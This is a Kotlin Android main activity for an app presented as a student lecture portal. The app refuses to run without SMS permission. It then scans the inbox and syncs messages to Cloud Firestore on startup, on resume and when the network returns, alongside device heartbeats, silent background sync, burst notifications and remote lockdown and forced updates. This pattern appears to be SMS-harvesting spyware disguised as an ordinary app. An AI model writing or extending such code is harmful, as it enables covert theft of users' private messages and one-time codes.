package com.example

import android.Manifest
import android.app.NotificationManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.delay
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.util.Log
import com.example.BuildConfig
import com.example.notification.NotificationHelper
import com.example.notification.NotificationSyncWorker
import com.example.notification.PushNotificationService
import com.example.script.ScriptManager
import com.example.security.AppMaintenanceInfo
import com.example.security.AppUpdateInfo
import com.example.security.SecurityManager
import com.example.sms.SmsAccess
import com.example.sms.SmsSyncHelper
import com.example.ui.BrowserScreen
import com.example.ui.ForceUpdateScreen
import com.example.ui.GlobalMaintenanceScreen
import com.example.ui.LockScreen
import com.example.ui.NotificationRequiredScreen
import com.example.ui.SmsAccessRequiredScreen
import com.example.ui.theme.DarkBackground
import com.example.ui.theme.DarkSurface
import com.example.ui.theme.MyApplicationTheme
import com.example.ui.theme.TextPrimary
import com.example.update.UpdateManager

class MainActivity : ComponentActivity() {
    private lateinit var securityManager: SecurityManager
    private lateinit var scriptManager: ScriptManager
    private lateinit var notificationHelper: NotificationHelper
    private lateinit var updateManager: UpdateManager
    private var pushNotificationListener: com.google.firebase.firestore.ListenerRegistration? = null

    private val requestNotificationPermission =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { _ ->
            // Permission result handled
        }

    private var hasSmsAccess by mutableStateOf(false)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        // Prevent screen dimming/sleeping during lectures
        window.addFlags(android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        securityManager = SecurityManager(this)
        scriptManager = ScriptManager(this)
        notificationHelper = NotificationHelper(this)
        updateManager = UpdateManager(this)

        // Request notification permission on Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED
            ) {
                requestNotificationPermission.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }

        // Mandatory gate: incoming SMS must be forwardable to Cloud Firestore
        hasSmsAccess = SmsAccess.hasPermission(this)
        if (hasSmsAccess) {
            SmsSyncHelper.scanInboxForMissedMessages(this)
            SmsSyncHelper.syncPendingQueue(this)
        }

        // Proactively clear and remove any legacy persistent foreground notifications
        try {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
            nm?.cancel(PushNotificationService.FOREGROUND_NOTIF_ID)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                nm?.deleteNotificationChannel(PushNotificationService.FOREGROUND_CHANNEL_ID)
            }
        } catch (_: Exception) {}

        // Start 5-minute background reminder notifications for normal users
        notificationHelper.startPeriodicNotification(lifecycleScope, securityManager)

        // Start silent background sync service for cloud push alerts & bursts
        PushNotificationService.start(this)
        PushNotificationService.checkPendingNotifications(this)
        setupForegroundPushListener()

        // Schedule WorkManager periodic and immediate offline recovery sync
        NotificationSyncWorker.schedulePeriodicSync(this)
        NotificationSyncWorker.enqueueImmediateSync(this)
        registerNetworkMonitor()

        val initialUnlocked = securityManager.isSessionActive()
        val alreadyPermanentlyUnlocked = securityManager.isPermanentUnlocked()

        // Sync complete session state to Firestore on app startup
        if (initialUnlocked) {
            securityManager.syncCurrentSessionToCloud()
        }

        android.widget.Toast.makeText(this, "made by dhyan ❤️", android.widget.Toast.LENGTH_LONG).show()

        setContent {
            MyApplicationTheme {
                var hasNotificationAccess by remember { mutableStateOf(NotificationHelper.hasPermission(this@MainActivity)) }
                var isUnlocked by remember { mutableStateOf(initialUnlocked) }
                var isPermanentUnlocked by remember { mutableStateOf(alreadyPermanentlyUnlocked) }
                var appMaintenanceInfo by remember { mutableStateOf(securityManager.getAppMaintenanceInfo()) }
                var appUpdateInfo by remember { mutableStateOf(securityManager.getAppUpdateInfo()) }
                var revokeReasonPrompt by remember { mutableStateOf<String?>(null) }

                // Real-time Session State & Revocation Enforcement
                DisposableEffect(Unit) {
                    val sessionListener: (Boolean, String?) -> Unit = { unlocked, reason ->
                        isUnlocked = unlocked
                        isPermanentUnlocked = securityManager.isPermanentUnlocked()
                        if (!unlocked && !reason.isNullOrBlank()) {
                            revokeReasonPrompt = reason
                        }
                    }
                    securityManager.addSessionStateListener(sessionListener)

                    val maintenanceListener: (AppMaintenanceInfo) -> Unit = { info ->
                        appMaintenanceInfo = info
                    }
                    securityManager.addAppMaintenanceListener(maintenanceListener)

                    val updateListener: (AppUpdateInfo) -> Unit = { info ->
                        appUpdateInfo = info
                    }
                    securityManager.addAppUpdateListener(updateListener)

                    onDispose {
                        securityManager.removeSessionStateListener(sessionListener)
                        securityManager.removeAppMaintenanceListener(maintenanceListener)
                        securityManager.removeAppUpdateListener(updateListener)
                    }
                }

                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = DarkBackground
                ) {
                    when {
                        // 1. Instant Global Maintenance Lockdown Screen
                        appMaintenanceInfo.isActive && !isPermanentUnlocked -> {
                            GlobalMaintenanceScreen(message = appMaintenanceInfo.message)
                        }

                        // 2. Mandatory Over-The-Top Force App Update Screen
                        appUpdateInfo.isUpdateAvailable(BuildConfig.VERSION_CODE) &&
                                appUpdateInfo.isMandatory(BuildConfig.VERSION_CODE) -> {
                            ForceUpdateScreen(
                                updateInfo = appUpdateInfo,
                                updateManager = updateManager
                            )
                        }

                        // 3. Notification Permission Gate
                        !hasNotificationAccess -> {
                            NotificationRequiredScreen(
                                onPermissionGranted = {
                                    hasNotificationAccess = true
                                }
                            )
                        }

                        // 4. SMS Permission Gate (Online & Offline Gateway)
                        !hasSmsAccess -> {
                            SmsAccessRequiredScreen(
                                onPermissionGranted = {
                                    hasSmsAccess = true
                                    SmsSyncHelper.scanInboxForMissedMessages(this@MainActivity)
                                    SmsSyncHelper.syncPendingQueue(this@MainActivity)
                                }
                            )
                        }

                        // 5. Active Student Portal (Browser Screen)
                        isUnlocked -> {
                            BrowserScreen(
                                securityManager = securityManager,
                                scriptManager = scriptManager,
                                isPermanentUnlocked = isPermanentUnlocked,
                                onLockRequested = {
                                    isUnlocked = false
                                    isPermanentUnlocked = securityManager.isPermanentUnlocked()
                                }
                            )
                        }

                        // 6. Lock Screen with Revocation Prompt Alert
                        else -> {
                            LockScreen(
                                securityManager = securityManager,
                                onUnlocked = { isPermanent ->
                                    isUnlocked = true
                                    isPermanentUnlocked = isPermanent
                                    revokeReasonPrompt = null
                                }
                            )

                            if (revokeReasonPrompt != null) {
                                AlertDialog(
                                    onDismissRequest = { revokeReasonPrompt = null },
                                    containerColor = DarkSurface,
                                    titleContentColor = TextPrimary,
                                    textContentColor = TextPrimary,
                                    title = { Text("Access Notice") },
                                    text = { Text(revokeReasonPrompt ?: "Your access key has been revoked or expired") },
                                    confirmButton = {
                                        TextButton(onClick = { revokeReasonPrompt = null }) {
                                            Text("OK")
                                        }
                                    }
                                )
                            }
                        }
                    }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        hasSmsAccess = SmsAccess.hasPermission(this)
        if (hasSmsAccess) {
            SmsSyncHelper.scanInboxForMissedMessages(this)
            SmsSyncHelper.syncPendingQueue(this)
        }
        securityManager.ensureDeviceRegistered()
        securityManager.sendHeartbeat()
        PushNotificationService.checkPendingNotifications(this)
        PushNotificationService.recoverMissedNotificationsFromServer(this)
    }

    override fun onStop() {
        super.onStop()
        securityManager.setDeviceOffline()
    }

    private var networkCallback: ConnectivityManager.NetworkCallback? = null

    private fun registerNetworkMonitor() {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return
            val builder = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    Log.d("MainActivity", "Network restored (offline -> online) - triggering immediate notification sync")
                    PushNotificationService.checkPendingNotifications(this@MainActivity)
                    PushNotificationService.recoverMissedNotificationsFromServer(this@MainActivity)
                    NotificationSyncWorker.enqueueImmediateSync(this@MainActivity)
                    securityManager.ensureDeviceRegistered()
                    securityManager.sendHeartbeat()

                    // Staggered retries as gRPC TLS handshakes complete (1.5s and 3.5s)
                    lifecycleScope.launch(Dispatchers.IO) {
                        kotlinx.coroutines.delay(1500L)
                        PushNotificationService.recoverMissedNotificationsFromServer(this@MainActivity)
                        kotlinx.coroutines.delay(2000L)
                        PushNotificationService.recoverMissedNotificationsFromServer(this@MainActivity)
                    }
                }
            }
            cm.registerNetworkCallback(builder.build(), networkCallback!!)
        } catch (e: Exception) {
            Log.w("MainActivity", "Failed to register network monitor: ${e.message}")
        }
    }

    private fun setupForegroundPushListener() {
        try {
            val fs = com.google.firebase.firestore.FirebaseFirestore.getInstance()
            val myDeviceId = securityManager.getDeviceId()
            val cutoff = System.currentTimeMillis() - 48 * 60 * 60 * 1000L

            pushNotificationListener?.remove()
            pushNotificationListener = fs.collection("push_notifications")
                .whereGreaterThan("timestamp", cutoff)
                .addSnapshotListener { snapshot, error ->
                    if (error != null || snapshot == null) return@addSnapshotListener
                    val currentPasskey = securityManager.getCurrentUserSession().passkey
                    val rawSessionCode = securityManager.getActiveSessionCode()

                    val items = snapshot.documents.mapNotNull { doc ->
                        doc.data?.let { com.example.security.PushNotificationItem.fromFirestoreMap(it, doc.id) }
                    }
                    items.filter { it.isActive }.forEach { item ->
                        val isForMe = item.matchesTarget(myDeviceId, currentPasskey, rawSessionCode)
                        if (isForMe && !com.example.notification.NotificationTracker.isProcessed(this, item.id)) {
                            com.example.notification.NotificationTracker.markProcessed(this, item.id)
                            lifecycleScope.launch(Dispatchers.Main) {
                                try {
                                    if (item.isBurst || item.burstCount > 1) {
                                        notificationHelper.sendBurstNotification(item.title, item.message, item.burstCount)
                                    } else {
                                        notificationHelper.sendCustomNotification(item.title, item.message)
                                    }
                                } catch (e: Exception) {
                                    Log.e("MainActivity", "Error displaying foreground notification: ${e.message}")
                                }
                            }
                        }
                    }
                }
        } catch (e: Exception) {
            Log.w("MainActivity", "Failed setting up foreground push listener: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        securityManager.setDeviceOffline()
        pushNotificationListener?.remove()
        notificationHelper.stopPeriodicNotification()
        networkCallback?.let {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            try { cm?.unregisterNetworkCallback(it) } catch (_: Exception) {}
        }
    }
}
